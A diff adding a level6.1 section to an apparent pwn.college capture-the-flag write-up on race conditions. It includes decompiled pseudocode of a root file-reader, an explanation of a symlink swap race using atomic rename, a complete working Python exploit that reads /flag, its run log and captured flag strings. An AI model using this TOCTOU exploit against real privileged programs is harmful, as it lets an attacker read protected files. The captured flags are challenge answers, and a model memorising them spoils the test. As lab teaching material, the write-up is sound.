@@ -1926,14 +1926,14 @@ int __fastcall main(int argc, const char **argv, const char **envp)
 
 This is identical to [level5.0](#level50) with one critical difference: the directory check now uses **`lstat`** instead of `stat`. This means it **does not follow symlinks** on the directory component.
 
-In level5.0 the `pivot -> /etc` trick worked because `stat` followed `pivot` through to `/etc` and checked its metadata. With `lstat`, calling it on `"pivot"` stops at the symlink itself — returning our uid, not root's — so the ownership check fails.
+In level5.0 the `pivot -> /etc` trick worked because `stat` followed `pivot` through to `/etc` and checked its metadata. With `lstat`, calling it on `pivot` stops at the symlink itself, returning our uid and not root's, so the ownership check fails.
 
 The solution is to construct a path where `dirname` resolves to something whose **final component is a real root-owned directory**, not a symlink. `lstat` follows all intermediate components freely, only stopping at the final one.
 
 Using the path `pivot/challenge/babyrace_level6.0`:
 
 - `dirname("pivot/challenge/babyrace_level6.0")` = `"pivot/challenge"`
-- `lstat("pivot/challenge")` — `pivot` is an intermediate component so it is followed, `challenge` is the final component — checks `/challenge` itself, which is a real root-owned directory ✓
+- `lstat("pivot/challenge")` = `pivot` is an intermediate component so it is followed, `challenge` is the final component, checks `/challenge` itself, which is a real root-owned directory ✓
 
 So when `pivot` → `/`:
 - `lstat("pivot/challenge/babyrace_level6.0")` = `lstat("/challenge/babyrace_level6.0")` = real file ✓
@@ -2081,3 +2081,214 @@ pwn.college{c6bBmyZdAsYHSdVjp1vh-buv2hM.0VMxQDL4ITM0EzW}
 
 &nbsp;
 
+## level6.1
+
+> Exploit a complex race condition to read the flag. This race condition involves multiple steps, which makes it less reliable to exploit!
+
+```text
+hacker@race-conditions~level6-1:~$ /challenge/babyrace_level6.1
+###
+### Welcome to /challenge/babyrace_level6.1!
+###
+
+Through this series of challenges, you will become familiar with the concept of race conditions. This challenge allows
+you to open a single file, as specified by the first argument to the program (argv[1]).
+
+The file opened will be be sent to you.
+
+This challenge will verify that the file's path does not include "flag".
+This challenge will verify that the file is not a symlink.
+This challenge will verify that the directory the file is in is owned by root
+and that other users are not able to create files in that directory.
+babyrace_level6.1: <stdin>:76: main: Assertion `argc > 1' failed.
+Aborted
+```
+
+The program performs four checks before opening the file:
+
+1. The path must not contain the string `"flag"`.
+2. The file at that path must not be a symlink (`lstat` → `S_ISLNK`).
+3. The directory containing the file must be owned by root (`lstat` → `st_uid == 0`).
+4. The directory must not be group owned by non-root and must not be world-writable (`st_gid == 0`, `st_mode & 2 == 0`).
+
+### Source code analysis
+
+```c title="/challenge/babyrace_level6.1 :: main() :: Pseudocode" showLineNumbers
+int __fastcall main(int argc, const char **argv, const char **envp)
+{
+  char *v3; // rax
+  char *v4; // rax
+  int v5; // eax
+  size_t v6; // rax
+  struct stat stat_buf; // [rsp+20h] [rbp-1A0h] BYREF
+  char buf[264]; // [rsp+B0h] [rbp-110h] BYREF
+  unsigned __int64 v10; // [rsp+1B8h] [rbp-8h]
+
+  v10 = __readfsqword(0x28u);
+  setvbuf(stdin, 0LL, 2, 0LL);
+  setvbuf(_bss_start, 0LL, 2, 0LL);
+  puts("###");
+  printf("### Welcome to %s!\n", *argv);
+  puts("###");
+  putchar(10);
+  if ( argc <= 1 )
+    __assert_fail("argc > 1", "<stdin>", 0x28u, "main");
+  if ( strstr(argv[1], "flag") )
+  {
+    puts("Error: path contains `flag`!");
+    exit(1);
+  }
+  if ( (unsigned int)lstat((char *)argv[1], &stat_buf) == -1 )
+  {
+    puts("Error: failed to get file status!");
+    exit(1);
+  }
+  if ( (stat_buf.st_mode & 0xF000) == 40960 )
+  {
+    puts("Error: file is a symlink!");
+    exit(1);
+  }
+  v3 = strdup(argv[1]);
+  v4 = dirname(v3);
+  if ( (unsigned int)lstat(v4, &stat_buf) == -1 )
+  {
+    puts("Error: failed to get directory status!");
+    exit(1);
+  }
+  if ( stat_buf.st_uid )
+  {
+    puts("Error: directory not owned by root!");
+    exit(1);
+  }
+  if ( stat_buf.st_gid )
+  {
+    puts("Error: directory not group owned by root!");
+    exit(1);
+  }
+  if ( (stat_buf.st_mode & 2) != 0 )
+  {
+    puts("Error: other users are able to write in this directory!");
+    exit(1);
+  }
+  v5 = open(argv[1], 0);
+  v6 = read(v5, buf, 0x100uLL);
+  write(1, buf, v6);
+  puts("### Goodbye!");
+  return 0;
+}
+```
+
+Same binary logic as [level6.0](#level60) but with the `getchar()` pauses removed, making the race window microseconds wide.
+
+The same path trick applies — `pivot/etc/passwd` where:
+
+- `lstat("pivot/etc/passwd")` — `pivot` and `etc` are intermediate components followed freely, `passwd` is the final component checked — `/etc/passwd` is a real file ✓
+- `lstat(dirname("pivot/etc/passwd"))` = `lstat("pivot/etc")` — `pivot` is intermediate so followed, `etc` is the final component — checks `/etc` itself, root-owned, no world-write ✓
+- `open("pivot/etc/passwd")` — when `pivot` → `evilroot`, resolves to `evilroot/etc/passwd` → `/flag` ✓
+
+Since there are no pauses, a background thread constantly swaps `pivot` between the good state (`/`) and the evil state (`./evilroot`) using `os.rename()` which is **atomic** — unlike `unlink` + `symlink`, `rename` replaces the target in a single kernel operation, avoiding the gap where the path doesn't exist at all. The sleep values bias the swap to spend more time in the good state (longer validation window) and less in the evil state (just long enough for `open()` to catch it).
+
+```text
+Good state: pivot -> /
+  lstat("pivot/etc/passwd") = /etc/passwd = real file ✓
+  lstat("pivot/etc")        = /etc        = root-owned ✓
+
+Evil state: pivot -> ./evilroot
+  open("pivot/etc/passwd")  = evilroot/etc/passwd -> /flag ✓
+```
+
+### Exploit
+
+```python title="~/script.py" showLineNumbers
+import subprocess, threading, os, time, warnings
+warnings.filterwarnings("ignore")
+
+TARGET = "/challenge/babyrace_level6.1"
+
+# Cleanup
+os.system("rm -rf pivot_good pivot_evil pivot evilroot")
+
+# Evil tree: evilroot/etc/passwd -> /flag
+os.mkdir("evilroot")
+os.mkdir("evilroot/etc")
+os.symlink("/flag", "evilroot/etc/passwd")
+
+# Pre-create both symlinks
+os.symlink("/", "pivot_good")
+os.symlink("./evilroot", "pivot_evil")
+
+# Initial state
+os.symlink("/", "pivot")
+
+def racer():
+    while True:
+        try:
+            # GOOD STATE: pivot/etc/passwd -> /etc/passwd
+            os.rename("pivot_good", "pivot")
+            os.symlink("/", "pivot_good")
+
+            # longer validation window
+            time.sleep(0.003)
+
+            # EVIL STATE: pivot/etc/passwd -> evilroot/etc/passwd -> /flag
+            os.rename("pivot_evil", "pivot")
+            os.symlink("./evilroot", "pivot_evil")
+
+            # short open() window
+            time.sleep(0.0003)
+
+        except:
+            pass
+
+threading.Thread(target=racer, daemon=True).start()
+
+print("[*] Starting exploit loop...")
+attempt = 0
+
+while True:
+    attempt += 1
+
+    p = subprocess.run(
+        [TARGET, "pivot/etc/passwd"],
+        stdout=subprocess.PIPE,
+        stderr=subprocess.DEVNULL,
+    )
+
+    out = p.stdout.decode(errors="ignore")
+
+    if attempt % 100 == 0:
+        print(f"[*] Attempt {attempt}...")
+
+    if "pwn.college{" in out:
+        print("[+] Got the flag!")
+        print(out)
+        break
+```
+
+```text
+hacker@race-conditions~level6-1:~$ python ~/script.py
+[*] Starting exploit loop...
+[*] Attempt 100...
+[*] Attempt 200...
+[*] Attempt 300...
+[*] Attempt 400...
+[*] Attempt 500...
+[*] Attempt 600...
+[*] Attempt 700...
+[*] Attempt 800...
+[*] Attempt 900...
+[*] Attempt 1000...
+[*] Attempt 1100...
+[*] Attempt 1200...
+[*] Attempt 1300...
+[*] Attempt 1400...
+[*] Attempt 1500...
+[*] Attempt 1600...
+[+] Got the flag!
+###
+### Welcome to /challenge/babyrace_level6.1!
+###
+
+pwn.college{gdJUNlscBjleeiCj6Lg_IeFOHWs.0lMxQDL4ITM0EzW}
+### Goodbye!
+```
